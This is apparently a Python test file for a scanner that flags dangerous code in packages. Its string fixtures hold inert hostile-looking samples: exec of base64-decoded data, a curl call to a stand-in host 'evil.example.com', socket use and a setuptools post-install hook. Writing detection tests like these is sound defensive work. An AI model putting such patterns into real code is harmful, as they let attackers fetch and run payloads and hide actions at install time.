"""Pruebas del extractor AST."""

from pathlib import Path

from pyscan.extractors.ast_extractor import ASTExtractor

MALICIOUS = '''
import os, base64, socket
def run():
    exec(base64.b64decode("cHJpbnQoMSk="))
    os.system("curl http://evil.example.com/x")
    s = socket.socket()
    ip = "10.0.0.5"
'''

BENIGN = '''
import json
def add(a, b):
    """Suma dos números."""
    return a + b
'''

SETUP_HOOK = '''
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)

setup(name="x", version="1.0", cmdclass={"install": PostInstall})
'''


def test_detects_dangerous_calls(tmp_path: Path):
    (tmp_path / "mod.py").write_text(MALICIOUS, encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert "exec" in rep.dangerous_calls
    assert "base64.b64decode" in rep.dangerous_calls
    assert "os.system" in rep.dangerous_calls
    assert "socket.socket" in rep.dangerous_calls


def test_detects_imports_and_network(tmp_path: Path):
    (tmp_path / "mod.py").write_text(MALICIOUS, encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert {"os", "base64", "socket"}.issubset(set(rep.imports))
    assert any("evil.example.com" in u for u in rep.network_literals)
    assert "10.0.0.5" in rep.network_literals


def test_benign_code_is_clean(tmp_path: Path):
    (tmp_path / "mod.py").write_text(BENIGN, encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert rep.dangerous_calls == []
    assert rep.network_literals == []
    assert rep.has_install_hook is False


def test_setup_install_hook_detected(tmp_path: Path):
    (tmp_path / "setup.py").write_text(SETUP_HOOK, encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert rep.has_install_hook is True


ALIASED = '''
import subprocess as sp
from os import system as ejecutar
from base64 import b64decode

sp.run(["ls"])
ejecutar("whoami")
b64decode("cHJpbnQoMSk=")
'''


def test_detects_aliased_dangerous_calls(tmp_path: Path):
    """Evasión por alias: `import subprocess as sp` o `from os import system`."""
    (tmp_path / "mod.py").write_text(ALIASED, encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert "subprocess.run" in rep.dangerous_calls
    assert "os.system" in rep.dangerous_calls
    assert "base64.b64decode" in rep.dangerous_calls


def test_alias_does_not_leak_between_files(tmp_path: Path):
    """Un alias definido en un archivo no debe afectar a otro archivo."""
    (tmp_path / "a.py").write_text("import subprocess as sp\n", encoding="utf-8")
    (tmp_path / "b.py").write_text("class X:\n    def run(self): ...\n\nsp = X()\nsp.run()\n",
                                   encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert "subprocess.run" not in rep.dangerous_calls


def test_broken_syntax_is_skipped(tmp_path: Path):
    (tmp_path / "broken.py").write_text("def (((:\n", encoding="utf-8")
    (tmp_path / "ok.py").write_text("import os\nos.system('x')\n", encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    assert "os.system" in rep.dangerous_calls  # el archivo válido sí se procesa


def test_findings_have_file_and_line(tmp_path: Path):
    """Cada hallazgo peligroso trae su ubicación (archivo:línea)."""
    (tmp_path / "mod.py").write_text(MALICIOUS, encoding="utf-8")
    rep = ASTExtractor().extract(tmp_path)
    calls = [f for f in rep.findings if f.kind == "dangerous_call"]
    assert calls
    assert all(f.line > 0 and f.file == "mod.py" for f in calls)
